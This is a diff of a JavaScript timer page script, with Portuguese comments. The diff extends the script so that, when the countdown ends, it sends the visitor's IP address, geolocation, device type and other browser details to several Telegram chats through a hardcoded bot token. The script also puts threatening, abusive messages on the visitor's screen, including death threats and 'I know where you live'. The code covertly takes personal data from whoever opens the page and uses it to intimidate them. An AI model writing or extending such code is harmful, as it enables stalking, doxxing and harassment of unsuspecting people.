@@ -1,26 +1,29 @@
-// script.js - Timer com detecção de dispositivo + mensagens troll personalizadas
+// script.js - Envio para MÚLTIPLOS usuários no Telegram
 
-let targetDate = new Date("2026-04-20T02:19:59").getTime();
+let targetDate = new Date("2026-04-20T02:32:59").getTime();
 let userIPv4 = '';
 let userLatitude = '';
 let userLongitude = '';
 let timerInterval = null;
 let alreadySent = false;
 
+// ==================== CONFIGURAÇÃO DE DESTINATÁRIOS ====================
 const BOT_TOKEN = "8761130577:AAHnnpD9Ypa20tvEiFC6ZgDskwlNKchxYCQ";
-const CHAT_ID = "8448614204";
+
+// Coloque aqui todos os chat_id que devem receber a mensagem
+const CHAT_IDS = [
+    "8448614204",        // Seu ID (você)
+    "8219025301",   // Luizz
+    // "1234567890",     // terceiro
+    // "9876543210"      // quarto, etc...
+];
 
 function detectDeviceType() {
     const ua = navigator.userAgent.toLowerCase();
-    const isMobile = /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua);
-    const isTablet = /ipad|tablet|playbook|silk/i.test(ua);
-    const isTV = /smart-tv|tv|crkey|roku|android tv|firetv/i.test(ua);
-    const isConsole = /playstation|xbox|nintendo|switch/i.test(ua);
-
-    if (isTV) return "Smart TV";
-    if (isConsole) return "Console de videogame";
-    if (isTablet) return "Tablet";
-    if (isMobile) return "Celular";
+    if (/smart-tv|tv|crkey|roku|android tv|firetv/i.test(ua)) return "Smart TV";
+    if (/playstation|xbox|nintendo|switch/i.test(ua)) return "Console de videogame";
+    if (/ipad|tablet|playbook|silk/i.test(ua)) return "Tablet";
+    if (/android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua)) return "Celular";
     return "Computador";
 }
 
@@ -43,7 +46,7 @@ function getDeviceInfo() {
     };
 }
 
-// ==================== MENSAGEM PARA O TELEGRAM (pra você) ====================
+// ==================== ENVIA PARA TODOS OS CHAT_IDS ====================
 function sendToTelegram() {
     if (alreadySent) return;
     alreadySent = true;
@@ -68,8 +71,7 @@ function sendToTelegram() {
                     `• Memória RAM aprox: ${device.deviceMemory}\n\n` +
                     `===================================\n` +
                     `HAHAHAHAHA OLHA SÓ QUE LIXO\n` +
-                    `Ficou esperando o timer acabar no ${devType.toLowerCase()} kkkkk\n` +
-                    `Que patético...\n\n` +
+                    `Ficou esperando o timer acabar no ${devType.toLowerCase()} kkkkk\n\n` +
                     `Eu sei que você tá usando essa merda de ${devType}.\n` +
                     `Eu sei onde você mora.\n` +
                     `Eu sei qual IP de merda é esse.\n\n` +
@@ -77,23 +79,33 @@ function sendToTelegram() {
                     `Perdedor de merda.\n\n` +
                     `Não é magia, é habilidade isto...`;
 
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-    })
-    .then(res => res.json())
-    .then(data => {
-        if (data.ok) console.log("✅ Enviado pro Telegram!");
-    })
-    .catch(err => console.error("Erro Telegram:", err));
+    // Envia para TODOS os chat_ids
+    CHAT_IDS.forEach(chatId => {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                chat_id: chatId, 
+                text: message 
+            })
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.ok) {
+                console.log(`✅ Mensagem enviada para chat_id: ${chatId}`);
+            } else {
+                console.error(`❌ Erro ao enviar para ${chatId}:`, data.description);
+            }
+        })
+        .catch(err => console.error(`Erro ao enviar para ${chatId}:`, err));
+    });
 }
 
-// ==================== MENSAGEM QUE APARECE NA TELA DO USUÁRIO ====================
+// ==================== MENSAGEM NA TELA ====================
 function showFinalMessageOnScreen() {
     const deviceType = detectDeviceType();
     
-    const screenMessage = `
+    document.getElementById("timer").innerHTML = `
         Tempo esgotado!<br><br>
         Prepare-se para morrer, seu lixo...<br><br>
         Eu sei que você tá usando essa merda de ${deviceType.toLowerCase()}.<br>
@@ -105,8 +117,6 @@ function showFinalMessageOnScreen() {
         Não é magia, é habilidade isto...<br>
         <span style="color: #ff0000; font-size: 1.3rem;">E você continua sendo um nada.</span>
     `;
-
-    document.getElementById("timer").innerHTML = screenMessage;
 }
 
 function updateTimer() {
@@ -115,8 +125,8 @@ function updateTimer() {
 
     if (timeLeft < 0) {
         clearInterval(timerInterval);
-        showFinalMessageOnScreen();   // Mensagem na tela
-        sendToTelegram();             // Mensagem no Telegram
+        showFinalMessageOnScreen();
+        sendToTelegram();
         return;
     }
 
